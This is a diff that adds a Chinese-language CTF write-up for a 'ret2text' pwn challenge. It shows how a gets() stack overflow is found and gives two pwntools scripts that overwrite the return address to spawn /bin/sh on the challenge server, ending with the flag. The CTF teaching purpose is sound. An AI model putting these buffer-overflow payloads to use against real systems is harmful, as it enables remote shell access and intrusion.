@@ -473,6 +473,60 @@ io.interactive()
 
 ------
 
+#### ret2text
+
+先`file ./ret2text`查看文件类型再`checksec --file=ret2text`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/1.png)
+
+用`IDA Pro 64bit`打开附件`ret2text`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/2.png)
+
+双击`welcome()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x80`，即可用栈大小只有`128`字节，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/3.png)
+
+在`Function Window`中注意到有一个名为`ctfshow()`的函数，函数返回值直接是系统调用`system('/bin/sh')`。
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/4.png)
+
+构造`payload`时可以先用`0x80`个字节占满`s`变量，再加上`rbp`的`8`个字节，然后加上`ctfshow()`函数的起始地址即可。然而我第一次编写的`Python`代码直接超时啦`timeout: the monitored command dumped core`。
+
+```python
+from pwn import *
+
+context(os="linux", arch="amd64", log_level='debug')
+# io = process('ret2text')
+io = remote('pwn.challenge.ctf.show', 28067)
+e = ELF('ret2text')
+ctfshow_address = e.symbols['ctfshow']
+log.success('ctfshow_address => %s' % hex(ctfshow_address).upper())
+payload = b'a'*0x80 + b'fuckpwn!' + p64(ctfshow_address)
+# payload = b'a'*0x80 + b'fuckpwn!' + p64(0x400637)
+io.sendline(payload)
+io.interactive()
+```
+
+那`payload`就不要加上`ctfshow()`函数的起始地址了，直接添加系统调用`system('/bin/sh')`的地址`0x40063B`。
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/5.png)
+
+编写`Python`代码即可得到`ctfshow{19efd671-89fa-4f27-8898-aaedfea5bb2c}`。
+
+```python
+from pwn import *
+
+io = remote('pwn.challenge.ctf.show', 28067)
+payload = b'a'*0x80 + b'fuckpwn!' + p64(0x40063B)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/6.png)
+
+------
+
 #### pwn03
 
 先`file ./pwn03`查看文件类型再`checksec --file=pwn03`检查了一下文件保护情况。
